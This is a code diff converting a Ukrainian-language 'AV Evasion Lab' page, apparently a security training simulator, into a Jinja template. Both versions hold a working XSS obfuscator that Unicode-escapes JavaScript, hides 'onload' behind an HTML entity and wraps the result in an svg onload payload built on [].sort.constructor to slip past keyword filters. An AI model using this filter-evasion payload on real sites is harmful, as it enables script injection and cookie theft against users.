@@ -1,210 +1,129 @@
-<!DOCTYPE html>
-<html lang="uk">
-<head>
-    <meta charset="UTF-8">
-    <title>Evasion Lab</title>
-    <style>
-        body { font-family: 'Courier New', monospace; background-color: #111; color: #ddd; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; }
-        
-        .header { text-align: center; margin-bottom: 40px; border-bottom: 2px solid #333; padding-bottom: 20px; }
-        .header h1 { color: #00d2ff; text-transform: uppercase; letter-spacing: 3px; }
-        
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
-        
-        .panel { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 5px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-        .panel h3 { margin-top: 0; color: #fff; border-bottom: 1px solid #444; padding-bottom: 10px; }
-        
-        textarea { width: 100%; height: 150px; background: #000; color: #0f0; border: 1px solid #333; padding: 10px; box-sizing: border-box; font-family: monospace; resize: vertical; }
-        
-        .btn { width: 100%; padding: 15px; margin-top: 10px; border: none; cursor: pointer; font-weight: bold; font-family: monospace; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
-        .btn-blue { background: #007bff; color: white; }
-        .btn-blue:hover { background: #0056b3; }
-        
-        .scanner-box { text-align: center; padding: 40px; border: 2px dashed #444; background: #0d0d0d; transition: 0.3s; position: relative; cursor: pointer; }
-        .scanner-box:hover { border-color: #666; }
-        
-        /* Анімація сканування */
-        .scan-line {
-            position: absolute; top: 0; left: 0; width: 100%; height: 5px;
-            background: #00d2ff;
-            box-shadow: 0 0 10px #00d2ff;
-            display: none;
-            animation: scan 1.5s infinite linear;
-        }
-        @keyframes scan { 0% {top: 0;} 50% {top: 100%;} 100% {top: 0;} }
+{% extends 'base.html' %}
 
-        /* Результати */
-        #result-area { margin-top: 20px; padding: 15px; display: none; text-align: center; font-weight: bold; word-break: break-all; }
-        .res-blocked { background: rgba(255, 0, 0, 0.2); border: 1px solid red; color: red; }
-        .res-clean { background: rgba(0, 255, 0, 0.2); border: 1px solid #0f0; color: #0f0; }
-
-        .back-btn { display: inline-block; margin-bottom: 20px; color: #666; text-decoration: none; }
-        .back-btn:hover { color: #fff; }
-        
-        .sigs { font-size: 11px; color: #777; margin-top: 5px; font-style: italic; }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <a href="/" class="back-btn">← Назад до головної</a>
-        
-        <div class="header">
-            <h1>AV Evasion Lab</h1>
-            <p>Завдання: Обійти сигнатурний аналіз.</p>
-        </div>
-
-        <div class="grid">
-            <!-- ЛІВА ЧАСТИНА: ГЕНЕРАТОР -->
-            <div class="panel">
-                <h3>1. Craft Payload</h3>
-                <p>Введіть JS код:</p>
-                <textarea id="sourceCode">alert('HACKED')</textarea>
-                <div class="sigs">🚫 Блокується: script, alert, onload, eval...</div>
-                
-                <button class="btn btn-blue" onclick="obfuscate()">🧠 BRAIN-MELT OBFUSCATION</button>
-                
-                <p style="margin-top: 15px;">Результат (Bypass):</p>
-                <textarea id="obfuscatedCode" readonly></textarea>
-                <button class="btn" style="background:#333; color:white;" onclick="downloadPayload()">💾 Завантажити .html</button>
-            </div>
-
-            <!-- ПРАВА ЧАСТИНА: СКАНЕР -->
-            <div class="panel">
-                <h3>2. VirusTotal Simulator</h3>
-                <p>Перетягніть файл сюди для перевірки.</p>
-                
-                <div class="scanner-box" id="dropZone">
-                    <div class="scan-line" id="scanLine"></div>
-                    <h2 style="pointer-events: none;">📂 DRAG & DROP</h2>
-                    <p style="pointer-events: none;">або клікніть</p>
-                    <input type="file" id="fileInput" style="display:none">
-                </div>
-
-                <div id="result-area"></div>
-            </div>
-        </div>
+{% block content %}
+<div style="max-width: 1000px; margin: 0 auto;">
+    
+    <div style="text-align: center; margin-bottom: 30px;">
+        <h1 style="color: #9b59b6; margin-bottom: 10px;">🛡️ AV Evasion Lab</h1>
+        <p style="color: #7f8c8d;">Симулятор обходу WAF та антивірусних сигнатур.</p>
     </div>
 
-    <script>
-        // === 1. ГЛОБАЛЬНЕ ВИПРАВЛЕННЯ DRAG & DROP ===
-        // Забороняємо браузеру відкривати файли при перетягуванні по ВСЬОМУ вікну
-        window.addEventListener("dragover", function(e){
-            e.preventDefault();
-            e.stopPropagation(); // Зупиняє спливання події
-        }, false);
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+        <div class="box" style="border-top: 5px solid #9b59b6;">
+            <h3 style="color: #9b59b6; margin-top: 0;">🧠 Obfuscator Payload</h3>
+            <p style="font-size: 13px; color: #666;">Введіть звичайний JS код, щоб приховати його.</p>
+            
+            <textarea id="sourceCode" class="code-preview" style="height: 100px; background: #fff; color: #333; border: 2px solid #eee;" placeholder="alert('HACKED')"></textarea>
+            
+            <button class="btn btn-purple btn-full" onclick="obfuscate()">OBFUSCATE CODE 🪄</button>
+            
+            <div style="margin-top: 20px;">
+                <label style="font-weight: bold; font-size: 12px; color: #666;">RESULT (Bypass):</label>
+                <textarea id="obfuscatedCode" class="code-preview" style="height: 100px;" readonly></textarea>
+                <button class="btn btn-gray btn-full" onclick="downloadPayload()">💾 SAVE .HTML</button>
+            </div>
+        </div>
 
-        window.addEventListener("drop", function(e){
-            e.preventDefault();
-            e.stopPropagation();
-        }, false);
+        <div class="box" style="border-top: 5px solid #34495e;">
+            <h3 style="color: #34495e; margin-top: 0;">🔍 VirusTotal Simulator</h3>
+            <p style="font-size: 13px; color: #666;">Перевірте, чи детектується ваш файл.</p>
+            
+            <div id="dropZone" style="border: 2px dashed #bdc3c7; padding: 40px; text-align: center; border-radius: 8px; cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; background: #f9f9f9;">
+                <div class="scan-line" id="scanLine" style="position: absolute; top:0; left:0; width:100%; height:4px; background:#e74c3c; box-shadow:0 0 10px red; display:none; animation: scan 1.5s infinite linear;"></div>
+                <div style="font-size: 40px; color: #bdc3c7;">📂</div>
+                <div style="font-weight: bold; color: #7f8c8d; margin-top: 10px;">Drop file here</div>
+                <input type="file" id="fileInput" style="display:none">
+            </div>
 
+            <div id="result-area" style="margin-top: 20px; padding: 15px; border-radius: 5px; text-align: center; display: none;"></div>
+        </div>
+    </div>
+</div>
 
-        // === 2. ПОТУЖНИЙ ОБФУСКАТОР (UNICODE + ENTITIES) ===
-        function obfuscate() {
-            let input = document.getElementById('sourceCode').value;
-            
-            // Крок 1: Перетворюємо весь код в Unicode Escape Sequence (\u0061...)
-            // Це ховає слова "alert", "document", "cookie" від сканера
-            let unicodeString = "";
-            for (let i = 0; i < input.length; i++) {
-                let hex = input.charCodeAt(i).toString(16).padStart(4, '0');
-                unicodeString += "\\u" + hex;
-            }
-            
-            // Крок 2: Ховаємо слово "onload" за допомогою HTML Entity
-            // l -> &#108; (браузер зрозуміє, Python-фільтр ні)
-            let safeOnload = "on&#108;oad"; 
-            
-            // Крок 3: Використовуємо [].sort.constructor замість eval() чи Function()
-            // Це динамічний спосіб створити функцію без використання заборонених слів
-            let payload = `<svg/id="x" ${safeOnload}="[].sort.constructor('${unicodeString}')()">`;
-            
-            document.getElementById('obfuscatedCode').value = payload;
+<style>
+    @keyframes scan { 0% {top: 0;} 100% {top: 100%;} }
+</style>
+
+<script>
+    // === 1. OBFUSCATOR ===
+    function obfuscate() {
+        let input = document.getElementById('sourceCode').value;
+        if(!input) { alert('Введіть код!'); return; }
+        
+        // Simple Unicode Obfuscation logic
+        let unicodeString = "";
+        for (let i = 0; i < input.length; i++) {
+            unicodeString += "\\u" + input.charCodeAt(i).toString(16).padStart(4, '0');
         }
+        let safeOnload = "on&#108;oad"; 
+        let payload = `<svg/id="x" ${safeOnload}="[].sort.constructor('${unicodeString}')()">`;
+        
+        document.getElementById('obfuscatedCode').value = payload;
+    }
 
-        // === 3. ЛОГІКА СКАЧУВАННЯ ===
-        function downloadPayload() {
-            let content = document.getElementById('obfuscatedCode').value;
-            if(!content) { alert('Спочатку створіть код!'); return; }
+    function downloadPayload() {
+        let content = document.getElementById('obfuscatedCode').value;
+        if(!content) { alert('Спочатку створіть код!'); return; }
+        let blob = new Blob([content], {type: "text/html"});
+        let link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = "stealth_payload.html";
+        link.click();
+    }
+
+    // === 2. SCANNER UI ===
+    const dropZone = document.getElementById('dropZone');
+    const fileInput = document.getElementById('fileInput');
+    const scanLine = document.getElementById('scanLine');
+    const resArea = document.getElementById('result-area');
+
+    dropZone.addEventListener('click', () => fileInput.click());
+    
+    // Drag & Drop
+    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.background = '#eef'; });
+    dropZone.addEventListener('dragleave', () => { dropZone.style.background = '#f9f9f9'; });
+    dropZone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropZone.style.background = '#f9f9f9';
+        if(e.dataTransfer.files.length) uploadAndScan(e.dataTransfer.files[0]);
+    });
+
+    fileInput.addEventListener('change', () => {
+        if(fileInput.files.length) uploadAndScan(fileInput.files[0]);
+    });
+
+    async function uploadAndScan(file) {
+        resArea.style.display = 'none';
+        scanLine.style.display = 'block';
+        dropZone.style.opacity = '0.6';
+        
+        const formData = new FormData();
+        formData.append('file', file);
+
+        await new Promise(r => setTimeout(r, 1000)); // Fake delay
+
+        try {
+            const response = await fetch('/scan_file', { method: 'POST', body: formData });
+            const data = await response.json();
             
-            let blob = new Blob([content], {type: "text/html"});
-            let link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = "stealth_payload.html";
-            link.click();
-        }
-
-        // === 4. ЛОГІКА ЗОНИ ЗАВАНТАЖЕННЯ ===
-        const dropZone = document.getElementById('dropZone');
-        const fileInput = document.getElementById('fileInput');
-        const scanLine = document.getElementById('scanLine');
-        const resArea = document.getElementById('result-area');
-
-        // Клік відкриває провідник
-        dropZone.addEventListener('click', () => fileInput.click());
-
-        // Обробка вибору через провідник
-        fileInput.addEventListener('change', function() {
-            if(this.files[0]) uploadAndScan(this.files[0]);
-        });
-
-        // Ефекти при наведенні (тільки для зони)
-        dropZone.addEventListener('dragenter', () => { dropZone.style.borderColor = '#00d2ff'; dropZone.style.background = '#222'; });
-        dropZone.addEventListener('dragleave', () => { dropZone.style.borderColor = '#444'; dropZone.style.background = '#0d0d0d'; });
-
-        // Обробка "кидання" файлу в зону
-        dropZone.addEventListener('drop', function(e) {
-            dropZone.style.borderColor = '#444'; 
-            dropZone.style.background = '#0d0d0d';
-            
-            let files = e.dataTransfer.files;
-            if (files.length > 0) {
-                uploadAndScan(files[0]);
-            }
-        });
-
-        // === 5. ВІДПРАВКА НА СЕРВЕР ===
-        async function uploadAndScan(file) {
-            resArea.style.display = 'none';
-            scanLine.style.display = 'block';
-            dropZone.style.opacity = '0.5';
-            dropZone.style.pointerEvents = 'none'; // Блокуємо повторні кліки
-            
-            const formData = new FormData();
-            formData.append('file', file);
-
-            // Імітація сканування
-            await new Promise(r => setTimeout(r, 1200));
-
-            try {
-                const response = await fetch('/scan_file', {
-                    method: 'POST',
-                    body: formData
-                });
-                const data = await response.json();
-                showResult(data);
-            } catch (e) {
-                alert("Помилка з'єднання");
-            } finally {
-                scanLine.style.display = 'none';
-                dropZone.style.opacity = '1';
-                dropZone.style.pointerEvents = 'auto';
-                fileInput.value = ''; 
-            }
-        }
-
-        function showResult(data) {
             resArea.style.display = 'block';
-            resArea.innerHTML = `<h3 style="margin:0">${data.message}</h3><p style="margin-top:5px; font-size:12px;">${data.details}</p>`;
+            resArea.innerHTML = `<strong>${data.message}</strong>`;
             
-            if (data.status === 'blocked') {
-                resArea.className = 'res-blocked';
+            if(data.status === 'blocked') {
+                resArea.style.background = '#fadbd8';
+                resArea.style.color = '#c0392b';
+                resArea.style.border = '1px solid #e6b0aa';
             } else {
-                resArea.className = 'res-clean';
+                resArea.style.background = '#d4efdf';
+                resArea.style.color = '#1e8449';
+                resArea.style.border = '1px solid #a9dfbf';
             }
+        } catch(e) { alert('Error'); } 
+        finally {
+            scanLine.style.display = 'none';
+            dropZone.style.opacity = '1';
+            fileInput.value = '';
         }
-    </script>
-</body>
-</html>
+    }
+</script>
+{% endblock %}
